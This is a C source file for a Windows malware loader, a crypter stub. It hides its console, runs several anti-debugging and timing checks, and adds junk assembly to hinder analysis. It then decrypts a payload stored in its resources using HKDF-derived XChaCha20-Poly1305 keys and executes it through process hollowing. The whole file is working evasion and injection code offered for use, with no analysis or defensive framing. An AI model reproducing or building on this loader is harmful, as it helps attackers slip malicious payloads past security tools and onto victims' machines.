#include <stdio.h>
#include <stdint.h>
#include <windows.h>
#include "crypto/hashing/sha.h"
#include "crypto/chacha20-poly1305/chacha20poly1305.h"
#include "headers/unpacker.h"
#include "headers/injection.h"
#include "headers/anti_debug.h"

/**
 * @brief Extracts an embedded resource from the executable.
 */
static unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize)
{
    HGLOBAL hResData;
    HRSRC   hResInfo;
    unsigned char* pvRes;
    HMODULE hModule = GetModuleHandle(NULL);

    if (((hResInfo = FindResource(hModule, MAKEINTRESOURCE(resourceId), resourceType)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
    {
        *dwSize = SizeofResource(hModule, hResInfo);
        return pvRes;
    }

    *dwSize = 0; 
    return NULL;
}

/**
 * @brief Securely cleans up resources and sensitive data.
 */
static void CleanupResources(CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize)
{
    if (crypto)
    {
        SecureZeroMemory(crypto->key, KEY_SIZE);
        SecureZeroMemory(crypto->nonce, NONCE_SIZE);
    }
    
    if (decrypted)
    {
        SecureZeroMemory(decrypted, payloadSize);
        VirtualFree(decrypted, 0, MEM_RELEASE);
    }
}

/**
 * @brief Add junk-code (does nothing useful)
 */
static int AddJunkCode()
{
    __asm__ __volatile__ (
        "nop\n\t"
        "xor %%rax, %%rax\n\t"
        "mov %%rax, %%rbx\n\t"
        "pushq %%rax\n\t"
        "add $33, %%rax\n\t"
        "popq %%rax\n\t"
        "nop\n\t"

        "mov $0, %%rcx\n\t"
        "cmp $0, %%rcx\n\t"
        "jne CODE\n\t"
        "bswap %%rcx\n\t"
        "inc %%rax\n\t"
        "nop\n\t"

        "CODE:\n\t"
        "lea 44(%%rax), %%rax\n\t"
        "sub $9, %%rax\n\t"
        "and %%rax, %%rax\n\t"
        "xor %%rax, %%rax\n\t"
        "nop\n\t"
        :
        :
        : "rax", "rbx", "rcx"
    );

    return 0;
}

#ifndef TESTING_MODE
int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    _IsDebuggerPresent();
    _ProcessDebugPort();
    _ProcessDebugFlags();

    AddJunkCode();

    Resources res = {0};
    CryptoContext crypto = {0};
    uint8_t* decrypted = NULL;

    // Load resources
    res.payload = GetResource(PAYLOAD_RESOURCE_ID, RT_RCDATA, &res.payloadSize);
    res.key = GetResource(KEY_RESOURCE_ID, RT_RCDATA, &res.keySize);
    res.nonce = GetResource(NONCE_RESOURCE_ID, RT_RCDATA, &res.nonceSize);

    DWORD64 qwStart = BeginDetectRDTSCBasedDelay();

    if ((res.payload == NULL || res.payloadSize == 0) ||
        (res.key == NULL || res.keySize != KEY_SIZE) ||
        (res.nonce == NULL || res.nonceSize != NONCE_SIZE)) {
        return 1;
    }

    if (EndDetectRDTSCBasedDelay(qwStart, THRESHOLD_30000))
    {
        AddJunkCode();
        return 1;
    }

    // Calculate hash and derive keys
    SHA256Context shaCtx;
    SHA256Reset(&shaCtx);
    SHA256Input(&shaCtx, res.payload, res.payloadSize);
    SHA256Result(&shaCtx, crypto.hash);
    memcpy(crypto.salt, crypto.hash, SALT_SIZE);

    PatchDbgBreakPoint();

    // HKDF key derivation
    HKDFContext hkdfCTX;
    memset(&hkdfCTX, 0, sizeof(hkdfCTX));
    if (hkdfReset(&hkdfCTX, SHA256, crypto.salt, SALT_SIZE) != 0 ||
        hkdfInput(&hkdfCTX, crypto.hash, KEY_SIZE) != 0 ||
        hkdfResult(&hkdfCTX, crypto.prk, (const uint8_t *)"obfuscation-context", 
            (int)strlen("obfuscation-context"), crypto.okm, OKM_SIZE) != 0)
    {
        goto cleanup;
    }

    memcpy(crypto.obfKey, crypto.okm, KEY_SIZE);
    memcpy(crypto.metaNonce, crypto.okm + 56, METANONCE_SIZE);

    // Decrypt key and nonce
    chacha20poly1305_ctx obfCtx;
    xchacha20poly1305_init(&obfCtx, crypto.obfKey, crypto.metaNonce);
    chacha20poly1305_decrypt(&obfCtx, res.key, crypto.key, KEY_SIZE);
    chacha20poly1305_decrypt(&obfCtx, res.nonce, crypto.nonce, NONCE_SIZE);

    // Decrypt payload
    decrypted = (uint8_t*)VirtualAlloc(NULL, res.payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted)
    {
        goto cleanup;
    }

    memcpy(decrypted, res.payload, res.payloadSize);
    chacha20poly1305_ctx decCtx;
    xchacha20poly1305_init(&decCtx, crypto.key, crypto.nonce);
    chacha20poly1305_decrypt(&decCtx, decrypted, decrypted, res.payloadSize);

    // Process hollowing and execution
    int result = ProcessHollowing(decrypted);
    if (result == 0)
    {
        CleanupResources(&crypto, decrypted, res.payloadSize);
        return 0;
    }

cleanup:
    CleanupResources(&crypto, decrypted, res.payloadSize);
    return 1;
}
#endif